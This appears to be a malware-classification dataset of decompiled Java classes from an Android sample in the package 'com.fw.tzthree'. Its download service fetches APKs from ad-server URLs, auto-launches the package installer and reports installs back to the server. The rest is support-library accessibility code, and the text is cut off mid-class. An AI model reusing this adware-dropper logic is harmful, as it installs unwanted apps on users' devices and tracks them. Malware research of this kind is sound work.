"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.service\a.code","class a implements q {   final AdInfo a;   final File b;   final int c;   final FwDservice d;   public a(  FwDservice fwDservice,  AdInfo adInfo,  File file,  int i){     this.d=fwDservice;     this.a=adInfo;     this.b=file;     this.c=i;   }   @Override public void a(  Bitmap bitmap){     this.d.a(new Notification(R.drawable.stat_sys_download_done,""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",ab.a()),bitmap,this.b,this.a,this.c,aa.a(this.d.getApplicationContext(),this.a));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.service\b.code","class b extends RequestCallBack<File> {   final AdInfo a;   final int b;   final y c;   final FwDservice d;   public b(  FwDservice fwDservice,  AdInfo adInfo,  int i,  y yVar){     this.d=fwDservice;     this.a=adInfo;     this.b=i;     this.c=yVar;   }   @Override public void onFailure(  HttpException httpException,  String str){     DownloadInfo a;     a=this.d.a(2,this.a,this.b,1L);     this.c.saveDownloadInfo(a);   }   @Override public void onLoading(  long j,  long j2,  boolean z){     super.onLoading(j,j2,z);     this.d.a(j2,j,this.a.getAdId().intValue(),this.b);   }   @Override public void onSuccess(  ResponseInfo<File> responseInfo){     DownloadInfo a;     DownloadSuccessInfo a2;     AppInfo b;     a=this.d.a(2,this.a,this.b,ab.a());     a2=this.d.a(a);     this.c.saveDownloadSuccessInfo(a2);     b=this.d.b(a);     this.c.saveAppInfo(b);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.service\c.code","public class c extends RequestCallBack<File> {   final boolean a;   final y b;   final AdInfo c;   final String d;   final int e;   final File f;   final AdSwitches g;   final FwDservice h;   private Notification i;   private Bitmap j;   private long k;   public c(  FwDservice fwDservice,  boolean z,  y yVar,  AdInfo adInfo,  String str,  int i,  File file,  AdSwitches adSwitches){     this.h=fwDservice;     this.a=z;     this.b=yVar;     this.c=adInfo;     this.d=str;     this.e=i;     this.f=file;     this.g=adSwitches;   }   @Override public void onFailure(  HttpException httpException,  String str){     DownloadInfo a;     a=this.h.a(1,this.c,this.e,1L);     this.b.saveDownloadInfo(a);     this.h.a(this.c,this.e,a,this.d);   }   @Override public void onLoading(  long j,  long j2,  boolean z){     this.h.a(j2,j,this.c.getAdId().intValue(),this.e);     this.h.a(this.i,this.j,this.c,this.e,j2,j);   }   @Override public void onStart(){     DownloadInfo a;     if (!this.a) {       this.b.postActionRequest(this.h.getApplicationContext(),this.c,5);     }     this.k=ab.a();     this.i=new Notification(R.drawable.stat_sys_download,""æ­£åœ¨ä¸‹è½½"",this.k);     this.h.a=(NotificationManager)this.h.getSystemService(""notification"");     SmartImageTask smartImageTask=new SmartImageTask(this.h.getApplicationContext(),new WebImage(this.d + this.c.getIcon()));     smartImageTask.setOnCompleteHandler(new d(this));     new Thread(smartImageTask).start();     a=this.h.a(1,this.c,this.e,0L);     this.b.saveDownloadInfo(a);   }   @Override public void onSuccess(  ResponseInfo<File> responseInfo){     DownloadInfo a;     DownloadSuccessInfo a2;     AppInfo b;     this.b.postActionRequest(this.h.getApplicationContext(),this.c,6);     this.h.a(this.i,this.j,this.f,this.c,this.e,this.g);     a=this.h.a(1,this.c,this.e,ab.a());     this.b.saveDownloadInfo(a);     a2=this.h.a(a);     this.b.saveDownloadSuccessInfo(a2);     b=this.h.b(a);     this.b.saveAppInfo(b);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.service\d.code","class d extends SmartImageTask.OnCompleteHandler {   final c a;   public d(  c cVar){     this.a=cVar;   }   @Override public void onComplete(  Bitmap bitmap){     Notification notification;     Notification notification2;     NotificationManager notificationManager;     Notification notification3;     Bitmap bitmap2;     Notification notification4;     Bitmap bitmap3;     Bitmap bitmap4;     Notification notification5;     Bitmap bitmap5;     PendingIntent activity=PendingIntent.getActivity(this.a.h.getApplicationContext(),new Random().nextInt(1000),new Intent(),134217728);     notification=this.a.i;     notification.setLatestEventInfo(this.a.h.getApplicationContext(),this.a.c.getAppName(),""æ­£åœ¨ä¸‹è½½"",activity);     if (bitmap != null) {       this.a.j=bitmap;       bitmap2=this.a.j;       if (bitmap2 != null) {         int a=n.a(this.a.h.getApplicationContext(),45.0f);         Context applicationContext=this.a.h.getApplicationContext();         notification4=this.a.i;         ImageView a2=u.a(View.inflate(applicationContext,notification4.contentView.getLayoutId(),null));         c cVar=this.a;         bitmap3=this.a.j;         cVar.j=n.a(bitmap3,a,a);         bitmap4=this.a.j;         if (bitmap4 != null && a2 != null) {           notification5=this.a.i;           RemoteViews remoteViews=notification5.contentView;           int id=a2.getId();           bitmap5=this.a.j;           remoteViews.setImageViewBitmap(id,bitmap5);         }       }     }     notification2=this.a.i;     notification2.flags=2;     u.a(this.a.h.getApplicationContext(),3038375);     notificationManager=this.a.h.a;     int intValue=this.a.c.getAdId().intValue() + 3038375 + (this.a.e * 1000);     notification3=this.a.i;     notificationManager.notify(intValue,notification3);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.service\e.code","public class e extends SmartImageTask.OnCompleteHandler {   final AdInfo a;   final int b;   final DownloadInfo c;   final Notification d;   final FwDservice e;   public e(  FwDservice fwDservice,  AdInfo adInfo,  int i,  DownloadInfo downloadInfo,  Notification notification){     this.e=fwDservice;     this.a=adInfo;     this.b=i;     this.c=downloadInfo;     this.d=notification;   }   @Override public void onComplete(  Bitmap bitmap){     NotificationManager notificationManager;     Intent intent=new Intent(this.e.getApplicationContext(),(Class<?>)FwDservice.class);     intent.putExtra(com.fw.tzthree.b.a.aX,this.a);     intent.putExtra(com.fw.tzthree.b.a.ba,this.b);     intent.putExtra(""033C9AA179013A52D68F761D575E5A4A"",this.c.getDownloadType());     intent.putExtra(com.fw.tzthree.b.a.bi,true);     this.d.setLatestEventInfo(this.e.getApplicationContext(),this.a.getAppName(),""ä¸‹è½½å¤±è´¥ï¼Œç‚¹å‡»é‡�è¯•"",PendingIntent.getService(this.e.getApplicationContext(),new Random().nextInt(1000) + 1,intent,134217728));     if (bitmap != null && bitmap != null) {       int a=n.a(this.e.getApplicationContext(),45.0f);       ImageView a2=u.a(View.inflate(this.e.getApplicationContext(),this.d.contentView.getLayoutId(),null));       Bitmap a3=n.a(bitmap,a,a);       if (a3 != null) {         this.d.contentView.setImageViewBitmap(a2.getId(),a3);       }     }     this.d.flags=2;     notificationManager=this.e.a;     notificationManager.notify(3038375 + this.a.getAdId().intValue() + (this.b * 1000),this.d);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.service\FwDservice.code","public class FwDservice extends Service {   private NotificationManager a;   public DownloadInfo a(  int i,  AdInfo adInfo,  int i2,  long j){     DownloadInfo downloadInfo=new DownloadInfo();     downloadInfo.setAdId(adInfo.getAdId());     downloadInfo.setCompleteTime(Long.valueOf(j));     downloadInfo.setAppName(adInfo.getAppName());     downloadInfo.setG2Switches(adInfo.getG2Switches());     downloadInfo.setG3Switches(adInfo.getG3Switches());     downloadInfo.setWifiSwitches(adInfo.getWifiSwitches());     downloadInfo.setIsInstalled(false);     downloadInfo.setIcon(adInfo.getIcon());     downloadInfo.setUrl(adInfo.getUrl());     downloadInfo.setDownloadType(Integer.valueOf(i));     downloadInfo.setAdType(Integer.valueOf(i2));     downloadInfo.setRecommend(adInfo.getRecommend());     downloadInfo.setPackageName(adInfo.getPackageName());     downloadInfo.setAppSize(adInfo.getAppSize());     return downloadInfo;   }   public DownloadSuccessInfo a(  DownloadInfo downloadInfo){     DownloadSuccessInfo downloadSuccessInfo=new DownloadSuccessInfo();     downloadSuccessInfo.setAdId(downloadInfo.getAdId());     downloadSuccessInfo.setCompleteTime(downloadInfo.getCompleteTime());     downloadSuccessInfo.setAppName(downloadInfo.getAppName());     downloadSuccessInfo.setG2Switches(downloadInfo.getG2Switches());     downloadSuccessInfo.setG3Switches(downloadInfo.getG3Switches());     downloadSuccessInfo.setWifiSwitches(downloadInfo.getWifiSwitches());     downloadSuccessInfo.setIcon(downloadInfo.getIcon());     downloadSuccessInfo.setUrl(downloadInfo.getUrl());     downloadSuccessInfo.setDownloadType(downloadInfo.getDownloadType());     downloadSuccessInfo.setAdType(downloadInfo.getAdType());     downloadSuccessInfo.setRecommend(downloadInfo.getRecommend());     downloadSuccessInfo.setPackageName(downloadInfo.getPackageName());     downloadSuccessInfo.setAppSize(downloadInfo.getAppSize());     return downloadSuccessInfo;   }   public void a(  long j,  long j2,  int i,  int i2){     Intent intent=new Intent();     intent.putExtra(com.fw.tzthree.b.a.bk,j);     intent.putExtra(com.fw.tzthree.b.a.bl,j2);     intent.putExtra(""adid"",i);     intent.putExtra(com.fw.tzthree.b.a.ba,i2);     intent.putExtra(com.fw.tzthree.b.a.bl,j2);     intent.setAction(com.fw.tzthree.b.a.bj);     sendBroadcast(intent);   }   public void a(  AdInfo adInfo,  int i,  DownloadInfo downloadInfo,  String str){     Notification notification=new Notification(R.drawable.stat_sys_download_done,""ä¸‹è½½å¤±è´¥ï¼Œç‚¹å‡»é‡�è¯•"",ab.a());     SmartImageTask smartImageTask=new SmartImageTask(getApplicationContext(),new WebImage(str + adInfo.getIcon()));     smartImageTask.setOnCompleteHandler(new e(this,adInfo,i,downloadInfo,notification));     new Thread(smartImageTask).start();   }   private void a(  String str,  File file,  y<?> yVar,  AdInfo adInfo,  String str2,  AdSwitches adSwitches,  int i,  boolean z){     new HttpUtils().download(str,file.getAbsolutePath(),true,true,(RequestCallBack<File>)new c(this,z,yVar,adInfo,str2,i,file,adSwitches));   }   public AppInfo b(  DownloadInfo downloadInfo){     AppInfo appInfo=new AppInfo();     appInfo.setAdId(downloadInfo.getAdId());     appInfo.setInstallTime(downloadInfo.getCompleteTime());     appInfo.setAppName(downloadInfo.getAppName());     appInfo.setG2Switches(downloadInfo.getG2Switches());     appInfo.setG3Switches(downloadInfo.getG3Switches());     appInfo.setWifiSwitches(downloadInfo.getWifiSwitches());     appInfo.setIcon(downloadInfo.getIcon());     appInfo.setUrl(downloadInfo.getUrl());     appInfo.setDownloadType(downloadInfo.getDownloadType());     appInfo.setAdType(downloadInfo.getAdType());     appInfo.setRecommend(downloadInfo.getRecommend());     appInfo.setPackageName(downloadInfo.getPackageName());     appInfo.setAppSize(downloadInfo.getAppSize());     return appInfo;   }   public void a(  int i,  AdInfo adInfo,  y<?> yVar,  String str,  String str2,  File file,  boolean z,  boolean z2){     if (!z && z2) {       yVar.postActionRequest(getApplicationContext(),adInfo,4);     }     AdSwitches a=aa.a(this,adInfo);     if (a != null && a.getShowStallBar() != null && a.getShowStallBar().isOn()) {       u.a(getApplicationContext(),i,adInfo,3038375,PendingIntent.getActivity(getApplicationContext(),new Random().nextInt(1000),new Intent(),134217728),true);     }     a(str2,file,yVar,adInfo,str,a,i,z);   }   public void a(  Notification notification,  Bitmap bitmap,  AdInfo adInfo,  int i,  long j,  long j2){     u.a(getApplicationContext(),adInfo,this.a,notification,r.a(getApplicationContext(),new Intent()),""æ­£åœ¨ä¸‹è½½  "" + ((100 * j) / j2) + ""%"",bitmap,2,i);   }   public void a(  Notification notification,  Bitmap bitmap,  File file,  AdInfo adInfo,  int i,  AdSwitches adSwitches){     Intent a=r.a(file);     PendingIntent a2=r.a(getApplicationContext(),a);     int i2=16;     if (adSwitches != null && adSwitches.getUninstallBar() != null && adSwitches.getUninstallBar().isOn()) {       i2=32;     }     notification.icon=R.drawable.stat_sys_download_done;     u.a(getApplicationContext(),adInfo,this.a,notification,a2,""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",bitmap,i2,i);     startActivity(a);   }   public void b(  int i,  AdInfo adInfo,  y<?> yVar,  String str,  String str2,  File file,  boolean z,  boolean z2){     AdSwitches a=aa.a(this,adInfo);     if (!z && z2) {       yVar.postActionRequest(getApplicationContext(),adInfo,4);     }     a(str2,file,yVar,adInfo,str,a,i,z);   }   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     super.onCreate();   }   @Override public void onDestroy(){     super.onDestroy();   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     if (intent == null) {       return super.onStartCommand(intent,i,i2);     }     int intExtra=intent.getIntExtra(""033C9AA179013A52D68F761D575E5A4A"",1);     AdInfo adInfo=(AdInfo)intent.getSerializableExtra(com.fw.tzthree.b.a.aX);     int intExtra2=intent.getIntExtra(com.fw.tzthree.b.a.ba,1);     boolean booleanExtra=intent.getBooleanExtra(com.fw.tzthree.b.a.bi,false);     boolean booleanExtra2=intent.getBooleanExtra(com.fw.tzthree.b.a.bm,true);     String trim=adInfo.getUrl().trim();     if (!com.fw.tzthree.d.e.a(getApplicationContext())) {       if (1 == intExtra) {         Toast.makeText(getApplicationContext(),""æ²¡æœ‰ç½‘ç»œ"",0).show();       }       return super.onStartCommand(intent,i,i2);     }     y<?> commonBusiness=y.getCommonBusiness(getApplicationContext(),intExtra2);     if (commonBusiness == null) {       return super.onStartCommand(intent,i,i2);     }     String resourcesAddr=commonBusiness.getSetting(getApplicationContext(),intExtra2).getResourcesAddr();     String str=resourcesAddr + trim;     File file=(!Environment.getExternalStorageState().equals(""mounted"") || g.a() == 0) ? new File(getCacheDir().getAbsolutePath() + File.separator + com.fw.tzthree.b.a.P+ File.separator+ intExtra2) : new File(Environment.getExternalStorageDirectory() + File.separator + com.fw.tzthree.b.a.P+ File.separator+ intExtra2);     if (!file.exists()) {       file.mkdirs();     }     File file2=new File(file,intExtra2 + str.substring(str.lastIndexOf(""/"") + 1));     if (2 == intExtra && file2.exists()) {       return super.onStartCommand(intent,i,i2);     }     if (!file2.exists() || booleanExtra) { switch (intExtra) { case 1:         if (intExtra2 == 1 && aa.a(getApplicationContext(),adInfo) != null && aa.a(getApplicationContext(),adInfo).getClickDown() != null && aa.a(getApplicationContext(),adInfo).getClickDown().isOn()) {           u.a(getApplicationContext(),intExtra2,adInfo,3038375 + adInfo.getAdId().intValue() + 123,r.b(getApplicationContext(),r.a(getApplicationContext(),1,adInfo,intExtra2,false,booleanExtra2)),true);         }       a(intExtra2,adInfo,commonBusiness,resourcesAddr,str,file2,booleanExtra,booleanExtra2);     break; case 2:   new HttpUtils().download(str,file2.getAbsolutePath(),true,true,(RequestCallBack<File>)new b(this,adInfo,intExtra2,commonBusiness)); break; case 3: b(intExtra2,adInfo,commonBusiness,resourcesAddr,str,file2,booleanExtra,booleanExtra2); break; } return super.onStartCommand(intent,i,i2); } if (((float)file2.length()) < Float.valueOf(adInfo.getAppSize().replace(""M"","""").trim()).floatValue() * 1024.0f * 1024.0f) { return super.onStartCommand(intent,i,i2); } DownloadInfo a=a(intExtra,adInfo,intExtra2,ab.a()); a.setCompleteTime(Long.valueOf(ab.a())); commonBusiness.saveDownloadInfo(a); commonBusiness.saveDownloadSuccessInfo(a(a)); commonBusiness.saveAppInfo(b(a)); Intent intent2=new Intent(); intent2.addFlags(268435456); intent2.setAction(""android.intent.action.VIEW""); intent2.setDataAndType(Uri.fromFile(file2),""application/vnd.android.package-archive""); startActivity(intent2); if (intExtra2 == 1) { u.a(this,intExtra2,adInfo,3038375 + adInfo.getAdId().intValue() + 123,PendingIntent.getActivity(getApplicationContext(),new Random().nextInt(1000),intent2,134217728),true); } n.a(getApplicationContext(),resourcesAddr + adInfo.getIcon(),new a(this,adInfo,file2,intExtra2)); this.a=(NotificationManager)getSystemService(""notification""); if (booleanExtra2) { commonBusiness.postActionRequest(getApplicationContext(),adInfo,4); } commonBusiness.postActionRequest(getApplicationContext(),adInfo,5); commonBusiness.postActionRequest(getApplicationContext(),adInfo,6); return super.onStartCommand(intent,i,i2); } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateBridge.code","public interface AccessibilityDelegateBridge {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateBridgeJellyBean.code","public interface AccessibilityDelegateBridgeJellyBean {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   Object getAccessibilityNodeProvider(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateCompat.code","public class AccessibilityDelegateCompat {   private static final Object DEFAULT_DELEGATE;   private static final AccessibilityDelegateImpl IMPL;   final Object mBridge=IMPL.newAccessiblityDelegateBridge(this); class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {     AccessibilityDelegateIcsImpl(){     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(obj,view,accessibilityEvent);     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat accessibilityDelegateCompat){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View view,        AccessibilityEvent accessibilityEvent){           return accessibilityDelegateCompat.dispatchPopulateAccessibilityEvent(view,accessibilityEvent);         }         @Override public void onInitializeAccessibilityEvent(        View view,        AccessibilityEvent accessibilityEvent){           accessibilityDelegateCompat.onInitializeAccessibilityEvent(view,accessibilityEvent);         }         @Override public void onInitializeAccessibilityNodeInfo(        View view,        Object obj){           accessibilityDelegateCompat.onInitializeAccessibilityNodeInfo(view,new AccessibilityNodeInfoCompat(obj));         }         @Override public void onPopulateAccessibilityEvent(        View view,        AccessibilityEvent accessibilityEvent){           accessibilityDelegateCompat.onPopulateAccessibilityEvent(view,accessibilityEvent);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup viewGroup,        View view,        AccessibilityEvent accessibilityEvent){           return accessibilityDelegateCompat.onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);         }         @Override public void sendAccessibilityEvent(        View view,        int i){           accessibilityDelegateCompat.sendAccessibilityEvent(view,i);         }         @Override public void sendAccessibilityEventUnchecked(        View view,        AccessibilityEvent accessibilityEvent){           accessibilityDelegateCompat.sendAccessibilityEventUnchecked(view,accessibilityEvent);         }       } );     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();     }     @Override public void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(obj,view,accessibilityEvent);     }     @Override public void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(obj,view,accessibilityNodeInfoCompat.getInfo());     }     @Override public void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(obj,view,accessibilityEvent);     }     @Override public boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent){       return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(obj,viewGroup,view,accessibilityEvent);     }     @Override public void sendAccessibilityEvent(    Object obj,    View view,    int i){       AccessibilityDelegateCompatIcs.sendAccessibilityEvent(obj,view,i);     }     @Override public void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(obj,view,accessibilityEvent);     }   } public interface AccessibilityDelegateImpl {     boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view);     Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat accessibilityDelegateCompat);     Object newAccessiblityDelegateDefaultImpl();     void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    Object obj,    View view,    int i);     void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {     AccessibilityDelegateJellyBeanImpl(){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view){       Object accessibilityNodeProvider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(obj,view);       if (accessibilityNodeProvider != null) {         return new AccessibilityNodeProviderCompat(accessibilityNodeProvider);       }       return null;     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat accessibilityDelegateCompat){       return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View view,        AccessibilityEvent accessibilityEvent){           return accessibilityDelegateCompat.dispatchPopulateAccessibilityEvent(view,accessibilityEvent);         }         @Override public Object getAccessibilityNodeProvider(        View view){           AccessibilityNodeProviderCompat accessibilityNodeProvider=accessibilityDelegateCompat.getAccessibilityNodeProvider(view);           if (accessibilityNodeProvider != null) {             return accessibilityNodeProvider.getProvider();           }           return null;         }         @Override public void onInitializeAccessibilityEvent(        View view,        AccessibilityEvent accessibilityEvent){           accessibilityDelegateCompat.onInitializeAccessibilityEvent(view,accessibilityEvent);         }         @Override public void onInitializeAccessibilityNodeInfo(        View view,        Object obj){           accessibilityDelegateCompat.onInitializeAccessibilityNodeInfo(view,new AccessibilityNodeInfoCompat(obj));         }         @Override public void onPopulateAccessibilityEvent(        View view,        AccessibilityEvent accessibilityEvent){           accessibilityDelegateCompat.onPopulateAccessibilityEvent(view,accessibilityEvent);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup viewGroup,        View view,        AccessibilityEvent accessibilityEvent){           return accessibilityDelegateCompat.onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);         }         @Override public boolean performAccessibilityAction(        View view,        int i,        Bundle bundle){           return accessibilityDelegateCompat.performAccessibilityAction(view,i,bundle);         }         @Override public void sendAccessibilityEvent(        View view,        int i){           accessibilityDelegateCompat.sendAccessibilityEvent(view,i);         }         @Override public void sendAccessibilityEventUnchecked(        View view,        AccessibilityEvent accessibilityEvent){           accessibilityDelegateCompat.sendAccessibilityEventUnchecked(view,accessibilityEvent);         }       } );     }     @Override public boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle){       return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(obj,view,i,bundle);     }   } class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {     AccessibilityDelegateStubImpl(){     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       return false;     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view){       return null;     }     @Override public Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat accessibilityDelegateCompat){       return null;     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return null;     }     @Override public void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){     }     @Override public void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent){       return true;     }     @Override public boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle){       return false;     }     @Override public void sendAccessibilityEvent(    Object obj,    View view,    int i){     }     @Override public void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityDelegateJellyBeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityDelegateIcsImpl();     }  else {       IMPL=new AccessibilityDelegateStubImpl();     }     DEFAULT_DELEGATE=IMPL.newAccessiblityDelegateDefaultImpl();   }   public boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     return IMPL.dispatchPopulateAccessibilityEvent(DEFAULT_DELEGATE,view,accessibilityEvent);   }   public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return IMPL.getAccessibilityNodeProvider(DEFAULT_DELEGATE,view);   }   public Object getBridge(){     return this.mBridge;   }   public void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     IMPL.onInitializeAccessibilityEvent(DEFAULT_DELEGATE,view,accessibilityEvent);   }   public void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){     IMPL.onInitializeAccessibilityNodeInfo(DEFAULT_DELEGATE,view,accessibilityNodeInfoCompat);   }   public void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     IMPL.onPopulateAccessibilityEvent(DEFAULT_DELEGATE,view,accessibilityEvent);   }   public boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return IMPL.onRequestSendAccessibilityEvent(DEFAULT_DELEGATE,viewGroup,view,accessibilityEvent);   }   public boolean performAccessibilityAction(  View view,  int i,  Bundle bundle){     return IMPL.performAccessibilityAction(DEFAULT_DELEGATE,view,i,bundle);   }   public void sendAccessibilityEvent(  View view,  int i){     IMPL.sendAccessibilityEvent(DEFAULT_DELEGATE,view,i);   }   public void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent){     IMPL.sendAccessibilityEventUnchecked(DEFAULT_DELEGATE,view,accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateCompatIcs.code","class AccessibilityDelegateCompatIcs { public interface AccessibilityDelegateBridge {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatIcs(){   }   public static boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return ((View.AccessibilityDelegate)obj).dispatchPopulateAccessibilityEvent(view,accessibilityEvent);   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridge accessibilityDelegateBridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return AccessibilityDelegateBridge.this.dispatchPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         AccessibilityDelegateBridge.this.onInitializeAccessibilityEvent(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      AccessibilityNodeInfo accessibilityNodeInfo){         AccessibilityDelegateBridge.this.onInitializeAccessibilityNodeInfo(view,accessibilityNodeInfo);       }       @Override public void 